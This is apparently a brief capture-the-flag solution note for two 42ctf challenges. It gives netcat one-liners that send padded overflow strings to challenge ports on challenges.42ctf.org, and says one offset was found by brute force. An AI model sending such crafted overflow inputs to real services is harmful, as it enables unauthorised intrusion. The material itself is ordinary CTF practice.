## The Answer
```sh
# could not find offset
# bruteforced it

$ (x=40; while [ $x -gt 0 ]; do echo -n "A"; x=$(( $x - 1 )); done; echo -n "*";) | \
nc challenges.42ctf.org 3001`
```
## GOTcha
```sh
$ echo "aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa" | \
nc challenges.42ctf.org 3003
```
